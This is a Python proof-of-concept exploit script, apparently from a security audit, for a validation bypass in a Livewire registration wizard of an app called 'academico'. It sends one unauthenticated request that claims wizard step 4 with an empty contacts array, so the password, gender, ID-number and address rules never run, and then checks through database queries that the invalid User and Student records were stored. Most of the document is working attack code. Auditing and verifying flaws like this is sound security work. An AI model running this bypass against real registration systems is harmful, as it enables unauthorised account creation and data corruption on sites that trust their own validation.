#!/usr/bin/env python3
"""
VULN-007 — Public registration: server-side validation is bypassable
           (only the client-claimed wizard step is validated on final submit).

Vulnerable code : targets/academico/app/Livewire/RegistrationWizard.php
                  register()            :161  -> calls validateCurrentStep() only
                  validateCurrentStep() :281  -> match(getActualStep()) rules
                  'review' step rules   :313  -> array_filter([...]) == [] by default
CWE             : CWE-20 (Improper Input Validation) / CWE-602 (client-side trust)

The flaw
--------
RegistrationWizard is a Livewire multi-step form. `currentStep` and every field
(`password`, `gender`, `idnumber`, `address`, ...) are PUBLIC Livewire properties,
so the browser can set any of them in the `updates` diff of a single
`POST /livewire-<hash>/update` request. The final submit handler `register()`
re-validates only `validateCurrentStep()` — the rule set for whatever step
`currentStep` currently *claims*. The 'review' step's rules resolve to an EMPTY
array unless `registration.terms_url` / `rules_url` are configured (both null by
default). So an attacker sends one request that declares `currentStep = 5`
(-> 'review' -> no rules) with arbitrary field values and calls `register()`:
NONE of the user_data / personal_info / picture rules (Password::min(6),
gender in:0,1,2, idnumber max:12, required address, image|max:5120) ever run,
and the User + Student rows are created straight from the raw public properties.

Exploitation idea
-----------------
One unauthenticated Livewire request: overwrite `currentStep=4` (the 'contacts'
step) with `contacts = []`, plus deliberately rule-violating user_data values
(1-char password, gender=9, 25-char idnumber, empty address), and invoke
register(). The 'contacts' step's rules are non-empty (`contacts => array`,
`contacts.*.firstname => required|...`, ...) so `validate()` does not error, yet
with an EMPTY contacts array every one of those rules is vacuously satisfied — and
crucially NONE of the user_data / personal_info / picture rules run. A successful
run proves the record was created with values that those steps forbid => bypass.

Note on the report's stated vector: the report suggested `currentStep=review`
(step 5). That path does NOT work here — with no terms_url/rules_url configured the
review rules array is empty, and Livewire's validate([]) throws MissingRulesException
(a 500, no record created). This exploit uses the 'contacts' step instead, which is
the actually-reachable bypass; the underlying finding (step-scoped validation is
bypassable) stands, only the concrete step differs.

What a successful run proves
---------------------------
A User+Student pair exists in the DB whose stored values violate the wizard's own
validation rules (weak password that Hash::check confirms, gender_id=9 which
`in:0,1,2` forbids, idnumber longer than max:12, empty required address) — i.e. the
constraints the app appears to enforce are optional to an attacker.
"""
import os
import secrets
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import lwlib
from lwlib import log

VULN = "VULN-007"
HERE = os.path.dirname(os.path.abspath(__file__))


def find_wizard_snapshot(page_html):
    """The register page carries a locale-switcher + the RegistrationWizard.
    Pick the snapshot whose serialized data holds the wizard's `currentStep`."""
    for raw, snap in lwlib.snapshots(page_html):
        if "currentStep" in (snap.get("data") or {}):
            return raw, snap
    raise RuntimeError("RegistrationWizard snapshot not found on /register")


def main():
    lwlib.banner(VULN, "Registration step-scoped validation bypass",
                 "RegistrationWizard::register -> validateCurrentStep (review step = no rules)")

    s = lwlib.new_session()

    # ---- STEP 1: fetch the public wizard, grab its Livewire snapshot + CSRF ----
    log("STEP", "GET /register (unauthenticated) to obtain a valid wizard snapshot")
    r = s.get(lwlib.BASE_URL + "/register", timeout=30)
    if r.status_code != 200:
        log("FAIL", f"/register returned {r.status_code}, expected 200")
        lwlib.verdict(VULN, "FAILED", "registration page not reachable")
        sys.exit(1)
    csrf = lwlib.csrf_of(r.text)
    snap_raw, _ = find_wizard_snapshot(r.text)
    log("INFO", "got RegistrationWizard snapshot (checksum will be re-verified server-side)")

    # ---- Build a deliberately invalid payload ---------------------------------
    # Each value below is forbidden by a *step* rule but we never let those rules run.
    suffix = secrets.token_hex(4)
    email = f"bypass_{suffix}@example.invalid"
    weak_password = "1"                      # violates Password::min(6)
    bad_gender = 9                           # violates gender in:0,1,2
    long_idnumber = "X" * 25                 # violates idnumber max:12
    empty_address = ""                       # violates address required

    log("INFO", f"crafted invalid registration: email={email} password='1' "
                f"gender=9 idnumber=25chars address=<empty>")

    updates = {
        # THE bypass: claim the 'contacts' step (4) with an EMPTY contacts array.
        # Its rules are non-empty (so no MissingRulesException) but vacuously pass,
        # while every user_data/personal_info/picture rule is skipped entirely.
        "currentStep": 4,
        "contacts": [],
        "firstname": f"By{suffix}",
        "lastname": f"Pass{suffix}",
        "email": email,
        "password": weak_password,
        "password_confirmation": weak_password,
        "gender": bad_gender,               # public int property, sent straight through
        "idnumber": long_idnumber,
        "address": empty_address,
        "birthdate": "",                    # empty -> Carbon::parse('') == now(), so create succeeds
    }
    calls = [{"path": "", "method": "register", "params": []}]

    log("STEP", "POST one Livewire update: currentStep=4 (contacts step, empty array = "
                "vacuous rules) + invalid user_data + call register()")
    resp = lwlib.lw_update(s, snap_raw, updates, calls, csrf)

    # Save raw request/response evidence.
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"POST /livewire-{lwlib.LW_HASH}/update HTTP/1.1\n")
        f.write(f"Host: {lwlib.BASE_URL.split('//')[1]}\n")
        f.write(f"X-CSRF-TOKEN: {csrf}\n")
        f.write("Content-Type: application/json\n\n")
        f.write('{"components":[{"snapshot":"<RegistrationWizard snapshot>",'
                f'"updates":{{"currentStep":4,"contacts":[],"email":"{email}","password":"1",'
                f'"gender":9,"idnumber":"{long_idnumber}","address":""}},'
                '"calls":[{"path":"","method":"register","params":[]}]}]}\n')
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP {resp.status_code}\n\n{resp.text[:4000]}\n")

    log("INFO", f"Livewire endpoint returned HTTP {resp.status_code}")
    if resp.status_code != 200:
        log("FAIL", f"unexpected status {resp.status_code}; body head: {resp.text[:300]}")
        lwlib.verdict(VULN, "FAILED", "Livewire update did not return 200")
        sys.exit(1)

    # A validation error would come back as a Livewire 'error' effect / 422.
    if '"errors"' in resp.text and ('password' in resp.text or 'gender' in resp.text or 'idnumber' in resp.text):
        log("FAIL", "server returned validation errors — the bypass did not hold")
        lwlib.verdict(VULN, "FAILED", "validation errors returned; step rules enforced")
        sys.exit(1)

    # ---- PROOF: read the DB back and confirm the invalid record persisted ------
    log("STEP", "querying the app DB to confirm the invalid User+Student were created")
    php = (
        f'$u = App\\Models\\User::where("email", "{email}")->first();'
        'if(!$u){ echo "NO_USER\\n"; return; }'
        '$s = App\\Models\\Student::find($u->id);'
        'echo "USER_ID=".$u->id."\\n";'
        'echo "PW_IS_1=".(\\Illuminate\\Support\\Facades\\Hash::check("1", $u->password)?"yes":"no")."\\n";'
        'echo "GENDER=".($s?$s->gender_id:"?")."\\n";'
        'echo "IDNUM_LEN=".($s?strlen($s->idnumber):"?")."\\n";'
        'echo "ADDRESS=[".($s?($s->address):"?")."]\\n";'
    )
    out = lwlib.tinker(php)
    print(out.strip())

    facts = dict(
        line.split("=", 1) for line in out.splitlines() if "=" in line and not line.startswith("[")
    )
    created = "USER_ID" in facts
    weak_pw = facts.get("PW_IS_1", "").strip() == "yes"
    bad_g = facts.get("GENDER", "").strip() == "9"
    long_id = facts.get("IDNUM_LEN", "0").strip().isdigit() and int(facts.get("IDNUM_LEN", "0")) > 12

    if created and weak_pw and bad_g and long_id:
        log("PROOF", f"User {facts['USER_ID'].strip()} created with password='1' (Hash::check ok), "
                     f"gender_id=9 (in:0,1,2 forbids), idnumber length={facts['IDNUM_LEN'].strip()} "
                     "(max:12 forbids) — every step rule was skipped")
        log("OK", "exploit confirmed — unauthenticated request bypassed all registration validation")
        lwlib.verdict(VULN, "CONFIRMED",
                      "one unauth Livewire request creates a User+Student violating every wizard rule")
        sys.exit(0)

    log("FAIL", "record missing or values did not violate the rules as expected")
    lwlib.verdict(VULN, "FAILED", "invalid record was not persisted")
    sys.exit(1)


if __name__ == "__main__":
    main()
